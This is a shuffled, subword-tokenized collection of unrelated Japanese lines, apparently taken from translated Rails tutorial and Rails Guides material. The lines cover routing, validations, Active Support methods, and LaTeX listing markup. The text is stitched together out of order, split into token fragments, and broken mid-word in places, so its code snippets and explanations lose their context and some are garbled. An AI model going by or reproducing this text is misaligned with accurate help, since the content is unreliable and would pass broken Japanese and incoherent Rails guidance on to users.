▁# ▁=> ▁ { : a =>1 }
▁この節では 、 まず ユーザーの 名前 と プロファイル 写 真 を表示する ための ページ を作成します ▟ モックアップ を 図 \ ref { fig : profile _ mockup _ profile _ name } に 示 しました
▁` last ` メソッドで 返す レコード の 最大 数を 数値 の 引数 で 指定することもできます 。
▁これは \ ref { sec : showing _ microposts } で 応用 する 予定です ▟)
▁たとえば 、1 人 の 提 供 者 ( supplier ) が 1 つの アカウント に 関連付け ら れ 、 さらに 1 つの アカウント が 1 つの アカウント 履 歴 に 関連付け られる 場合 、 supplier モデル は以下のような感じ になります 。
▁ と に か く \ k ode { about ▖ html ▖ erb } を 正しい ディレクトリに 作成 できたので 、 リスト \ ref { code : custom _ about _ page } のとおり に コードを 入力 します 。
▁╼╼\ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : toy _ app _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁* ▁その 他 、` empty ?` メソッド に応答する オブジェクト はすべて 空白 として 扱 われます 。
▁置き換えた結果を リスト \ ref { code : application _ layout _ full _ title } に示します 。
▁* ▁X - Content - Security - P ol ic y
▁このメソッドは `: years `、`: months `、`: weeks `、`: day s ` を キー に 持つ ハッシュ を受け取り 、 日付 を できる だけ 詳細な 形式で 、 現在の キー で 示 される とおり に 返します 。
▁* ▁` config ▖ beginning _ of _ week ` は 、 アプリケーション における 週 の 初 日 を設定します 。
▁これは 、 たとえば より よい 名前 に したい場合 に 便利です 。
▁\ k ode { user \_ id } と \ k ode { created \_ at } 両方 の カラム を 1 つの 配列 に含め ること で 、 Active ▁Record で \ emph { 両方 } の キーを 同時に 使用する \ emph { 複 合 キー インデックス } を作成 できます 。
▁ フォロワー の 統 計 情報 を表示する パーシャル
▁CoffeeScript コードを 開発 中 、 ページ 読み込み に関連する 処理 を追加した くなる ことが よく あります 。
▁JavaScript も 、 上 と同様に サーバー に リクエストを送信し 、 レスポンス を 解 析 することができます 。
▁詳細については [ セキュリティ ガイド ]( security ▖ html # 安全 でない クエリ 生成 ) を参照してください 。
▁最初に ` app / views / comments / _ comment ▖ html ▖ erb ` パーシャル に 削除 用の リンク を追加しましょう 。
▁ Account Activations リソース で 有効化 を モデル 化 した ので 、 トークン 自体 は リスト \ ref { code : account _ activations _ route } で定義した 名前付きルート の 引数 で 使用されます 。
▁リスト \ ref { code : a _ test _ for _ valid _ submission } では 、 ユーザー登録 に 成功 させた 後に 、 どの テンプレート が表示されている のか 検証 している ことにも注目してください 。
▁ 当 然 の ことです が 、 ログインを要求 するだけで は 十分 ではありません ▟ ユーザーが \ emph { 自分の 情報 だけ を } 編集 できるように する必要があります 。
▁Rails プロジェクト を新規作成する
▁A ▖ x ▁= ▁: a
▁ RubyGems が インストール されていない 場合は 、\ href { http :// ruby for ge ▖ org / f rs / ? group _ id = 12 6 } { RubyGems を ダウンロード } して 解 凍 し 、 作成された \ k ode { rubygems } ディレクトリ で セットアップ プログラム を実行し てください 。
▁Rails では 、 この ユーザー への 直接 リンク が 許 される ので 、 この場合 \ k ode { current _ user } は \ k ode { user _ path ( current _ user )} に 自動的に 変換 されます 。
▁ トークン の検証 は マ ス ク 解除 ▁( un ma s k ing ) と それ に 続 く 復 号 化 ▁( de crypt ing ) ▁ によって 行われます 。
▁ { p 0} の {2} rails ▁new {/2} コマンド と \ ref { sec : the _ first _ application } の {2} bundle ▁install {/2} コマンドを実行 した ことにより 、 実際に 動 か す こと の できる アプリケーション が作成され ました 。
▁#
▁ 動かない 理由 を 確認し たい 方は 、 実際に 実装 して ページネーション リンクを クリック してみてください 。
▁* ▁X - Frame - Options
▁* ▁[ Rack 入 門 ]( http :// ch ne u k ir ch en ▖ org / blog / archive / 200 7 / 02 / in tr o d u c ing - rack ▖ html )
▁#< Client ▁id : ▁2, ▁first _ name : ▁" J an " ▁> ,
▁ すべての エラー を含む ` ActiveModel :: Error s ` クラス のインスタンス を 1 つ 返します 。
▁ 同様に 、 `@ product ▖ picture s ` と すれば 写 真 の コレクション を ` Product ` モデルのインスタンス から 取得 できます 。
▁id = \ k ode {1} のユーザー を編集する ページ
▁make : ▁ / us r / bin / g cc - 4 ▖ 2 : ▁No ▁such ▁file ▁or ▁directory
▁もし 3 番目 に 該 当 した としても 、 すぐ その カテゴリ の 人 では なくなります ので ご 心 配 なく 。
▁まずは 、 フォローしているユーザー を生成する ために 、 能動的関係 に 焦 点を 当 て ていきます ▁( 受動的関係 については \ ref { sec : followers } で 考え ていきます ) 。
▁### ▁Active ▁Model
▁< p > Employee : ▁<%= ▁ employee ▖ name ▁%></ p >
▁< a ▁ href ="# " ▁on click =" paintIt ( this , ▁' # 99 0 000 ') "> P aint ▁it ▁red </ a >
▁ DateTime ▖ current ▖ change ( month : ▁2, ▁day : ▁30 )
▁ ╼\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁route _ tests ▁( end )╼╼ ▁\ subsection { Rails の ルート } ▁% ▁( fold )╼ ▁\ label { sec : rails _ routes }╼╼ To ▁add ▁the ▁named ▁routes ▁for ▁the ▁sample ▁app ' s ▁static ▁pages , ▁we ' ll ▁edit ▁the ▁routes ▁file , ▁\ k ode { config / \ - routes ▖ rb }, ▁that ▁Rails ▁uses ▁to ▁define ▁URL ▁m app ing s ▖
▁ただし 1 つ 例外 があります ▟ ページ ヘ の 出力 は 、 アクション が ビューを レンダリング しない 場合 であっても エスケープ されている 必要があります 。
▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol # Request _ methods } { HTTP } ▁( Hyper T ext ▁ Transfer ▁ Protocol ) ▁ には 4 つの 基本的な 操作 があり 、 それぞれ \ text tt { GET }、\ text tt { POST }、\ text tt { PATCH }、\ text tt { DELETE } という 4 つの 動詞 に 対応 づ け ら れ ています 。
▁ ひとつ のテスト を すべての アダプタ ー に対して 実行 するには 以下のように します 。
▁最後に 、 To y アプリケーションで 使用している Rails の コントローラと モデルの クラス 階層 について 簡単に 解説します 。
▁#### ▁` first ( limit ▁= ▁1) `
▁#### ▁Rails コーディング ルール に従う
▁`: allow _ nil ` を指定すると 、 ユーザーの プロファイル がない場合 に ` user ▖ name ` 呼び出し は ` nil ` を返します 。
▁Load ing ▁development ▁environment
▁# ▁=> ▁ 重複 の 有 無 を 問 わ ず すべての 名前 が 返される
▁今回の場合 は 、 Users コントローラの \ k ode { index } アクション を使用した い ので 、 リスト \ ref { code : rails _ routes _ root _ route } のコード を元に 書き換えて みましょう
▁2 つ め の 引数 ` indent _ string ` は 、 インデント に使用する 文字列 を指定します 。
▁a
▁ここでは 、 エンジンの ルーティング が アプリケーション 内の ルーティング から 分 離 されている ことに も ご 注 目 ください 。
▁このコードは リスト \ ref { code : relationship _ create _ test } で使用されていました ▟ もうひとつ 、
▁Rails の レイアウト では 、 アプリケーションの ページの 共通 部分を テンプレート に 置く ことで コードの 重複 を解決する ことができる 。
▁最初に 行った User ページ spec の 再 現 。
▁作成した コードをリスト \ ref { code : log _ out _ with _ _ close _ browser } に示します
▁| ▁DELETE ▁| ▁ / photos / : id ▁| ▁photos # destroy ▁| ▁image _ path (: id ) ▁|
▁これにより 、 Asset ▁Pipeline は 、2 つの 異 な った 状 況 に対して それぞれ 最 高 の 環境 を提供 してくれます ▟ つまり 、 プログラマ ー に対して は 見 や す く 分割 された フォーマット の ファイルを 提供し 、 本番環境 に対して は 最適化 された 1 つの ファイル を提供 してくれます 。
▁デフォルトでは 、 これらの ファイルは ` public / audio s ` 以下 から 読み込まれます 。
▁` deep _ merge !` メソッドは デ ィ ー プ マージ を 破 壊 的に 実行 します 。
▁上の 行 では 、 実際に その ページ に移動し ます 。
▁ 利用 している エディタ によって は 「 invalid ▁ multi by te ▁character 」 などの エラーメッセージ が表示される こと がある かもしれませんが 、 気 にする ことはありません 。
▁duplicate ▁# ▁=> ▁[ ' string ', ▁' another - string ']
▁ 実行 結果を 図 \ ref { fig : heroku _ app } に示します 。
▁has _ and _ belongs _ to _ many ▁: client s
▁この 世 には 10 種類の 人 々 が います ▟ 3 項 演算子 を 好 き な 人 、 嫌 い な 人 、 3 項 演算子 を 知 らない 人 です 。
▁ 今 の 時点 では 、 ソースコード を バージョン管理 下 に 置 か なければならない 理由 が 今 ひとつ よく わからない という 方が い る かもしれません ので 、 例を 1 つ 紹介します
▁Rails アプリケーションを 構 築 する 前に 、 Rails 本 体 が インストール されている ことを確認してください 。
▁これは 間 違い なく 大きな 進 歩 です ▟ しかし ここで 終 わ ら せず 、 さらに 改良 してみましょう ▟ 今度は \ k ode { render } を \ k ode {@ users } 変数 に対して \ emph { 直接 } 実行 します ▁( {2} {3} リスト 9 ▖ 48 {/3} {/2} ) 。
▁この ファイルは 、 エンジン で使用する レイアウト を指定する ためのものです 。
▁この モード は デフォルト よりも メモリ を 余 分 に 消 費 し 、 パフォーマンス も 落 ち るため お勧め できません 。
▁end
▁ ページ タイトル を追加する ために 、 典型的な Web ページの 構造 を 今 一度 お さ ら い しておきましょう ▁( リスト \ ref { code : html _ structure }) 。
▁HTML の 構造 全体 が 各 ページ で 重複 している 。
▁before フィルター を使うと 、 特定の アクション が 実行される 直前に メソッドを呼び出す ことができる
▁\ k ode { reverse _ relationships } では 以下のように \ k ode { followed _ id } を 外部キー として 使用します 。
▁create ▁app / models / user ▖ rb
▁mail ( to : ▁@ user ▖ email , ▁subject : ▁' Welcome ▁to ▁My ▁A wesome ▁ Site ')
▁" BigDecimal " ▁=> ▁" d ec im al ",
▁\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home } にアクセス した結果
▁ 認 証 に 成功 したら 、 パスワード 変更 用の フォーム を ユーザーに 表示する 。
▁図 \ ref { fig : home _ page _ with _ debug } の デバッグ 出力 には 、 描画 される ページ の状態 を 把 握 するのに 役 立 つ 情報 が含まれます 。
▁* ▁This ▁is ▁a ▁manifest ▁file ▁that ' ll ▁automatically ▁include ▁all ▁the ▁stylesheets
▁Rails のデフォルトの ` has _ one ` 関連付け は 、 ほとんどの場合 カスタマイズ 不要 ですが 、 時に は 関連付けの 動作を カスタマイズしたくなること も ある と思います 。
▁たとえば 、 / users /1/ edit ▁ が Users コントローラの \ k ode { edit } アクションに 正常に ルーティング されている としても 、\ k ode { edit } アクション が存在し なければ 、 この URL にアクセス したときに エラー になります 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api ▖ rubyonrails ▖ org / v 4▖1▖ 5 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を読んでみてください 。
▁なお 、 必要な gem は ここ まで で すべて インストール した ので 、 今後 の 章では 新 た な gem は 追加 しません 。
▁### ▁ パラメータ の 割り当て
▁` suppress ` メソッドを使用すると 例外 の 発生 を 止 め ることもできます 。
▁ 詳 しく は \ ref { sec : database _ migrations } から 解説します が 、\ k ode { {1} 図 2▖2 {/1} } のユーザー ▁( {3} users {/3} ) ▁ は データベースの テーブル ▁(\ emph { table }) ▁ に相当 します ▟ また 、 {3} id {/3} 、 {3} name {/3} 、 {3} email {/3} の 属性 は それぞれ テーブルの カラム ▁(\ emph { column } : ▁ 列 ) ▁ に相当 します 。
▁ 異なる 要素 から 同じ 値が 返される と 、 その キー の コレクション は 作成 されません 。
▁#### ▁` foreign _ key `
▁"2013-03-11 ▁01:05:24" , ▁updated _ at : ▁"2013-03-11 ▁01:05:24" > ]
▁ これはリスト \ ref { code : f _ error _ messages } で使用されていました 。
▁ 苗 字 と 名前 の両方 を 変数 に 割り当て ることもできます 。
▁\ k ode { name } 属性 の検証 には 、 空 文字 でない 、 名前 が 51 文字 未 満 である という 最小限 の 制 約 しか 与 え て いません でした ▟\ k ode { email } 属性 の場合は 、 有効なメールアドレス かどうかを 判 定 するために 、 もっと 厳 重 な 要求 を 満 た さ なければなりません 。
▁Ruby のバージョン を明示的に指定 した \ k ode { Gemfile } 。
▁この よう に記述 することで 、 他 で インクルード する 前に 関連する コードを グループ 化 できるように なり 、 記 述 が 簡潔 になり 保 守 が しやすくなり ます 。
▁Users リソース の場合と同様 に 、\ k ode { resources } メソッドを使用して 通常の RESTful な ルーティング を設定する ことができます 。
▁ ディレクトリ 内容 の表示
▁しかし 、 この フォーム には 1 つ 問題 があります 。
▁▖▖▖
▁#### ▁` parent _ name `
▁2 人目のユーザー が追加された 一覧 ページ ▁(\ href { http :// localhost :3000/ users }{/ users })
▁# ▁< name > A ar on ▁B at al ion </ name >
▁リスト { p 0} の {2} current _ user {/2} メソッド が動作する ようになった ので 、 ユーザーがログイン している かどうか に応じて アプリケーションの 動作を 変更 するための 準備が整いました 。
▁Client ▖ find _ by _ sql (" SELECT ▁* ▁FROM ▁clients
▁上の ルーティング では ` logout _ path ` と ` logout _ url ` が アプリケーションの 名前付き ヘルパー として 作成されます 。
▁ い い 感じ に リ サイズ された 画像
▁* ▁ クライアント側 で のバリデーション は 扱 い や す く 便利です が 、 一般に 単 独 では 信 頼 性 が 不 足 します 。
▁このメソッド が 便利な のは 、 ▁ _ after _ ▁ で始まる バリデーション を実行する 場合 だけです ▟ このメソッドは エラー の コレクション を調べる だけで 、 バリデーション そのもの を トリガ しない からです 。
▁\ k ode { private } キーワード 以降 で 定義された メソッドは すべて 隠 蔽 されます 。
▁この 質 問 への 回 答 ですが 、 読者 の 学習 スタイル や プログラミング 経験 次 第 で 異なる ため 、 一 口 には 言 え ません 。
▁ うまく できた かどうか は 、 本番環境 の コンソール に 接続 することで 確 認 できます 。
▁ これはリスト \ ref { code : signin _ form _ html } で使用されていました 。
▁ assoc ▖ has _ many ▁: products
▁` tableize ` メソッドは 、` underscore ` の 次に ` pluralize ` を実行し た ものです 。
▁Date ▖ new (200 9 , ▁ 12 , ▁31)▖ months _ since (2) ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010
▁\ k ode { xhr } は 先ほど 登 場 した ばかり ですが 、 本書 では ひ と まず コードの 文 脈 から 以下のコード の動作 を推測し ていた だ く よう お 願 い します 。
▁Twitter に なら い 、 どちらの ページ でも ユーザーの ログインを要求 します 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 ▖ be t a 1 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を読んでみてください 。
▁ / Users / mhartl / rails _ projects / sample _ app / config / routes ▖ rb
▁ だ い ぶ 乱 雑 になって きました 。
▁( 注意 : ▁Microposts コントローラ ファイルを コマンドラインで 生成 して い なかった ので 、 この コントローラ を 手動で 作成 する必要があります ) 。
▁# ▁=> ▁ActiveRecord :: RecordInvalid : ▁Validation ▁failed : ▁Name ▁can ' t ▁be ▁blank
▁Rails のデフォルトの アクションは 対応する ビュー を表示する ようになっています が 、\ k ode { create } アクション に対応する ビューの テンプレート がない ▁( ある は ず が ありません ) ▁ ため 、 テスト に 失敗します 。
▁ここまで の 手順 が 完了 すると 、 以下の コマンドで ローカル Web サーバー を 別 タブ で 実行 できるようになります ▁( 図 \ ref { fig : rails _ server _ new _ tab })
▁これらの メソッドは 、 対応する バ イ ト 数 を返す ときに 10 2 4 の 倍 数 を使用します 。
▁# ▁ 変更 が必要 : ▁form _ for は 、 存在しない PATCH ルート を 探 そう と する
▁ サンプルアプリケーションの ▁( ほぼ ) ▁ 静的なページ 。
▁* ▁` collection ( force _ reload ▁= ▁false ) `
▁リスト \ ref { code : a _ test _ for _ valid _ submission } のとき
▁ そのために は 、 Factory ▁Girl に 関連付け を作成する 方法を 知 っ ておく 必要があります 。
▁` beginning _ of _ month ` は ` at _ beginning _ of _ month ` の別名 、` end _ of _ month ` は ` at _ end _ of _ month ` の別名 です 。
▁Active ▁Support は 、 インスタンス変数 に 簡単に アクセス するための メソッドを 多数 提供し ています 。
▁* ▁Rails ▁4▖0 では ` ActionDispatch :: Routing ` の導入に伴い ` ActionController :: Routing ` が 非推奨 となり ました 。
▁\ k ode { from _ users _ followed _ by } を 改良 する 。
▁ 話 を 戻 して 、 Bootstrap の 変数 の 一覧 表 を見ると 、 薄 い 灰 色 に対して 以下の 変数 名 が与えられ ること に 気 が 付き ます 。
▁` build _ association ` メソッドは 、 関連付けられた 型の 新しい オブジェクトを返します 。
▁ これはリスト \ ref { code : friendly _ forwarding _ test } で使用されていました 。
▁上の例では ` require _ self ` が使用されています 。
▁ ルート URL にリダイレクトし ても よい ですが 、 一般的な 慣習 に したがって 、 新しく 作成された ユーザーの プロフィール ページに リダイレクト してみます 。
▁ただし 、 今 はまだ \ k ode { app / views / shared } といった ディレクトリ は 作 って い ないので 、 表 \ ref { table : uni x _ command _ line } で紹介した \ k ode { mkdir } コマンド を使い 、 新しく ディレクトリ を作成する必要があります 。
▁ここまで 実行 すれば 、 以下のように \ k ode { rails ▁ s } コマンド ▁(\ k ode { rails ▁server } コマンド の 短縮 版 ) ▁ を実行して ローカル Web サーバーを起動 できるようになります 。
▁ アプリケーションコード 内にある この ミドルウェア への 参 照 はすべて 削除 する必要があります ので 注意が必要です ▟ 例 :
▁ ブロック は 見た 目 に 反 して 奥 が 深 く 、 ブロック を 十分 に 理解 するためには 相 当 な プログラミング 経験 が必要です ▟ そのために は 、 ブロック を含む コードを たくさん 読み こ な す ことで ブロック の 本 質 を 会 得 する 以外に 方法 はありません
▁#### ▁select
▁Spork は Guard と併用する と 非常に 便利です ▟ 設定 を行う と 、 以下のように コマンド 上で 併 用 することができます 。
▁( 実際には \ k ode { rake } と タイプ する だけで済みます ▟\ k ode { rake } のデフォルトの 動作 は テストスイート の実行 です ) 。
▁class ▁P at i ent ▁< ▁ActiveRecord :: Base
▁( この時点では ) ▁ データベース を変更 した く ないので 、 コンソール を \ emph { サ ンド ボックス } モード で 起動 します 。
▁</ head >
▁TIP : ▁このオプション を使用する のは 、 レスポンス の content ▁type が どんな もの であっても よい 場合 のみ に してください 。
▁ 単 独 の 記事 は 表示 できるようになりました が 、 今度は 記事 の 一覧 も 表示 できるように してみましょう 。
▁ el s if ▁options [: counter _ cache ]
▁リスト \ ref { code : f _ error _ messages } と リスト \ ref { code : errors _ partial } のコード と 、 SCSS の リスト \ ref { code : error _ messages _ css } を 組み合わせ ること で 、 無効な ユーザー登録 情報 を送信し たとき の エラーメッセージ が 分 か り や す く なります ▁( 図 \ ref { fig : signup _ error _ messages }) 。
▁` render ` メソッドは さまざまな 方法で カスタマイズ できます 。
▁この 方法 なら 指定された タグ のみ が 許可 される ため 、 あらゆる 攻 撃 方法 や 邪悪な タグ に対して フィルタ が 健 全 に 機能 します 。
▁リスト \ ref { code : generating _ pages } では 、 コントローラ 名を キャメルケース ▁( 訳 注 : ▁ 単語 の 頭 文字 を 大文字 に して つ な ぎ 合わせ た 名前 ) ▁ で 渡 し ていることに注目してください ▟ こう すると 、 StaticPages コントローラ 名を \ href { https :// en ▖ w ikipedia ▖ org / wiki / S na k e _ case } { ス ネ ー ク ケース } ▁( 訳 注 : ▁ 単語 間 に アンダースコア を 加えて 繋 ぎ 合わせ た 名前 ) ▁ にした ファイル ▁\ k ode { static _ pages _ controller ▖ rb } ▁ を自動的に 生成 します 。
▁ 特に 、\ k ode { params } は 以下のような 入 れ 子 ハッシュ になっています ▟ ハッシュ の中に ハッシュ がある 構造 です 。
▁create
▁` config ▖ assets ▖ digest ` も true になっている 場合 、 アセット への リクエスト に ダイジェスト を含む ことが 必 須 となります 。
▁ 同様に 、 他の ヘッダー の 情報 も リスト \ ref { code : header _ partial } の パーシャル に移動し 、\ k ode { render } を呼び出し て レイアウト に 挿入する ことができます 。
▁#### # ▁`: status ` オプション
▁このメソッド の動作 は ` attr _ accessor ` や ` c attr _ accessor ` などの 兄弟 メソッド と似ています が 、 モジュール の ゲ ッ ター 名 と セッター 名 に 指定された 名前 を使用します 。
▁\ k ode { do } キーワード は 、 ▁\ k ode { form \_ for } が 1 つの 変数 を持つ ブロック を 取ること を表し ます ▟ この 変数 \ k ode { f } は ▁“ form ” ▁ の f です 。
▁INFO : ▁` c a m er ize ` メソッド の動作 は 、` underscore ` メソッドと 逆 の動作 と 考え ると わかりやす い でしょう ▟ ただし 完全に 逆 の動作 ではありません ▟ たとえば 、` " SSL Error "▖ underscore ▖ camelize ` を実行し た 結果は ` " S s l Error " ` になり 、 元に戻 り ません 。
▁ 完 全 を 期 して 、 今後 は チュートリアル の最後 まで 基本的に 上の 方法 を使用して テストを フル 実行 します 。
▁ この時点で 、 テストはパスするはずです 。
▁次に ステータスフィード を RSS フィード する 機能 も 実装 し 、 余 裕 があれば フィード に 認 証 ス キー ム も 追加 して アクセス を 制限 してみてください 。
▁route ▁" root ▁to : ▁' people # index ' "
▁$ ▁git ▁push ▁ origin ▁my _ pull _ request ▁- f
▁この モデル は 、 イン ター ネ ッ ト バ ン キ ング や 金融 取 引 口 座 などの 重要な 情報 を扱う Web サイトに 向 い ています 。
▁ エンジン が 持つ アセット は 、 ホスト 側 の アプリケーションでは 必ず し も 必要 ではない ことがあります 。
▁上 を どう に か して \ emph { 変数 } として 扱 いた い のです ▟ そこで 以下 を呼び出す ことにします 。
▁従って 、 以下のような require 文 を実行し た だけで は
▁ 属性 を更新する もうひとつ の 方法は 、\ k ode { update _ attributes } を使う ものです
▁def ▁ welcome _ email ( user , ▁email _ body )
▁| ▁PATCH / PUT ▁| ▁ / sekret / comments / : id (▖ : format ) ▁| ▁comments # update ▁| ▁comment _ path ▁|
▁ここでは 、 `@ article ▖ errors ▖ any ?` で エラーが発生し ている かどうかを チェック しています ▟ そして エラー の場合は `@ article ▖ errors ▖ full _ messages ` で エラーメッセージ を 全 文 表示 します 。
▁Client ▖ select (: name )▖ distinct
▁ 一 重 引 用 符 と 二 重 引 用 符 が 既に 両方 使用されている ので 、 この ペ イ ロー ド では 引 用 符 が 使用できません 。
▁ 通常 、 これは \ emph { gem } のインストール に 関連 します ▟ gem とは 自 己 完 結 型の Ruby コードの パッケージ です 。
▁ 通常 、 Tilt を ` Tilt :: Template ` のように サブクラス 化 して ` prepare ` メソッドと ` eval u ate ` メソッド を再 実装します ▟ ` prepare ` メソッドは テンプレート を 初期化 し 、` eval u ate ` メソッドは 処理 の 終 わ った ソース を返します 。
▁このメソッド では 、` assert _ valid _ keys ` を使用した 制御 を実装 しています 。
▁つまり 、` http :// localhost :3000/ blorgh / articles ` に移動し なくても ` http :// localhost :3000/ blorgh ` に 移動 すれば 済 む ということです 。
▁ 本書 では 今後 も この サンプルアプリケーション を使い 続ける ので 、\ href { https :// bitbucket ▖ org / repo / create } { Bitbucket 上に リポジトリ を作成して プッシュ しておく } と よいでしょう 。
▁resources ▁: comments
▁ テスト と サイトの 実装 を 結 び つ け る 方法 の例 は 他にも 多数 あります 。
▁We ’ ll ▁learn ▁much ▁more ▁about ▁the ▁association ▁facilit ies ▁in ▁Active ▁Record ▁in ▁Chapter ▁\ ref { cha : user _ microposts } ▁and ▁Chapter ▁\ ref { cha : following _ users } ▖
▁== ▁Create Users : ▁migrat ing ▁= ================ ================
▁ 使用する ツール について
▁* ▁` offset `
▁ バリデーション の概要
▁JSON は JavaScript の データ 形式 の 一 種 で 、 多くの Ajax ライブラリ で使用され ています 。
▁` include ?` の 逆 の動作 です 。
▁ 正しい データ だけ をデータベースに保存する のであれば 、 モデル レベルで バリデーション を実行する のが 最適です 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / s li ce ▖ rb ` です 。
▁ エンジンの ` app ` ディレクトリ の中に は 、 通常の アプリケーションで お な じ み の 標準 の ` assets `、` controllers `、` helpers `、` mailers `、` models `、` views ` ディレクトリ が置かれます 。
▁now ▁= ▁ DateTime ▖ current ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁ 19 : 27 : 5 2 ▁- 0 400
▁ユーザー を新規作成する には 、\ href { http :// localhost :3000/ users / new }{\ text tt { 図 2▖ 5}} の {2} {3} new {/3} {/2} ページ を表示します
▁` Active ▁Record ▁O b server ` と ` Action ▁Controller ▁S w eep er ` は ` rails - observers ` ▁gem に 切り 出 されました 。
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ads / : id ▁| ▁ ads # show ▁| ▁ ある 雑 誌 1 冊 に含まれる 広 告 を 1 つ 表示する ▁|
▁Sprockets ▖ register _ engine ▁' ▖ bang ', ▁B an g B an g :: Template
▁ 読者 の N i el s ▁ de ▁R on からの ご 指 摘 でした ▟ あり が と う ご ざ います 。
▁このコードは リスト \ ref { code : post _ signup } で使用されていました ▟ もうひとつ 、
▁この場合 、` user ▖ save ` を実行して 初めて データベースに レコードが コミット されます 。
▁Rails に 携 わ っている 人 の ほとんど は ボ ラン テ ィ ア なので 、 プルリクエスト に 何らかの 反 応 が 生じる まで に 数 日 か か ること も ざ ら に あります ▟ どう か め げ ずに プルリクエスト を ど し ど し 送信 してください 。
▁ 新しい パスワードを 再設定 するための フォーム ▁( 図 \ ref { fig : forgot _ password _ form _ mockup }) ▁ と 、 User モデル 内の パスワード を変更 するための フォーム ▁( 図 \ ref { fig : reset _ password _ form _ mockup }) ▁ が 両方 必要 になるので 、 今回は \ k ode { new }、\ k ode { create }、\ k ode { edit }、\ k ode { update } のルーティング も 必要 になります 。
▁これ より コメント の 部分 に 適切な コード を追加します 。
▁ リスク と 取 扱 い 上の 注意 を 十分 理解 している場合 に 限り 、` deep _ munge ` をオフに して アプリケーションを 従来 の動作 に 戻 す ことができます 。
▁ 何 人 か の 開発者 は 「 1 つの テスト に 複数の アサーション を 入 れる べ き ではない 」 と 強く 主 張 する でしょう 。
▁# ▁id ▁: integer ▁not ▁ null , ▁primary ▁key
▁INFO : ▁ 文字列を 判 定 する 述 語 として 、 Uni code 対応 した 文字 クラス である ` [: space : ]` が使用されています ▟ そのため 、 たとえば U + 20 2 9 ▁( 段 落 区切り 文字 ) は 空白 文字 と 判 断 されます 。
▁ここでは 、 よく 使われ る ケース のうち の いくつか について説明します ▟ それら は \ emph { 存在性 ▁( presence )} の検証 、\ emph { 長さ ▁( length )} の検証 、\ emph { フォーマット ▁( format )} の検証 、\ emph { 一意性 ▁( uniqueness )} の検証 です 。
▁この ディレクトリ 内で コントローラ や モデル 、 ビュー を生成し て アプリケーションを 拡張 し 、 続いて これら を使用して エンジン を テスト できます 。
▁ パスワード 再設定 画面 へのリンク を追加する
▁* ▁ 正しい コードを 書くこと 。
▁これらの マクロ は 、 Ruby に ビルトイン されている ` attr _ * ` と同様に 振る舞い ますが 、 内部 の インスタンス変数 の名前 が 衝 突 し にくい ように 配 慮 される 点 が異なります 。
▁ 本 文 および リスト \ ref { code : failed _ signin _ attempt } の コメント で 述べたように 、 このコード には 誤り があります 。
▁* ▁Rails ▁4▖0 では ` ActionDispatch :: Integration Test ` の導入に伴い ` ActionController :: Integration Test ` は 非推奨 となり ました 。
▁ 使用 可能な 長さ 制限 オプションは 以下の とおり です 。
▁@ account ▁= ▁@ supplier ▖ build _ account ( term s : ▁" Net ▁30 ")
▁ バージョン管理 システム を 熟 知 することは 、 今 や あらゆる ソフトウェア 開発者 にとって 必 須 の スキル である と 言 って よいでしょう 。
▁check _ box _ tag ▁' accept '
▁{0}{1} リスト 3 ▖ 4 {/1}{/0} を もう一度 注意 深 く 読んで み ると 、 アクションと ビュー の関係 性 について 理解 できる でしょう ▟\ k ode { home } アクションは 、\ k ode { home ▖ html ▖ erb } という ビュー に 対応 しています 。
▁この場合 、\ k ode { production ▖ rb } への 絶 対 パス は以下のようになります 。
▁この Web サイト では 、 Sass ではなく LESS を使って 変数 が 定義 されています が 、\ text tt { bootstrap - sass } という gem を使用すれば 、 Sass でも 同様 の 変数 が 使える ようになります 。
▁config ▖ action _ mailer ▖ interceptor s ▁= ▁[" Mail In ter ce p to r "]
▁time out : ▁5 000
▁ ヘルパーメソッド と カスタム RSpec マッチ ャ ー を追加する 。
▁ ジェネレータ を使用 したくない場合 は 、 app / mailers ディレクトリ 以下 に ファイルを作成し 、` ActionMailer :: Base ` を継承し てください 。
▁ 設定 を すべての Rails コンポーネント に 渡 したい場合は 、` config / application ▖ rb ` 内の 同じ ` config ` オブジェクト を使用して 行なうことができます 。
▁次の 章 に進む前に 、 差 分 を コミット して master ブランチにマージ しておきましょう 。
▁上のコードは 以下 と 同等です 。
▁gem ▁' sass - rails ', ▁" ~ > ▁3▖2 ▖ 3 "
▁User のデフォルト fixture
▁TIP : ▁` select ` を ` belongs _ to ` 関連付け で使用する 場合 、 正しい 結果を 得 るために `: foreign _ key ` オプションを 必ず 設定 してください 。
▁ エンコード は UT F -8 に 変 え てください 。
▁class ▁ Server ▁< ▁ :: Rack :: Server
▁ nd ▁%>╼ ▁ ▖╼ ▁ ▖╼ ▁ ▖╼ </ html >╼ \ end { code }╼\ end { code listing } ╼╼% ▁subsection ▁a _ test _ for _ valid _ submission ▁( end )╼╼ ▁\ section { プロ の デプロイ } ▁% ▁( fold )╼ ▁\ label { sec : professional _ grade _ deployment }╼╼
▁この コードが リスト \ ref { code : signup _ form } と 極めて 似 通 っ ていることに注目してください ▟ 重複 が多い ということは 、 それらの コードの 繰り返し を パーシャル に まとめ る ことができる ということです ▟ パーシャル に まとめ る 作業 は 演習 の 課題 ▁(\ ref { sec : updating _ deleting _ exercises }) ▁ に回します 。
▁CDN は コンテンツ を キャッシュ することで 動作します 。
▁ Delete d ▁branch ▁modify - README ▁( w as ▁2 c 92 be f )▖
▁has _ many ▁: picture s , ▁as : ▁: image able
▁\ k ode { ▖ gitignore } ファイルに \ k ode { bundler _ stub s } を追加する 。
▁ Content - Length : ▁ 12 656 0
▁これ の コマンド 全体 または 一 部 に ユーザー 入力 が 使用される ようなことがあ る 場合 、 特に 注意が必要です 。
▁``` ruby
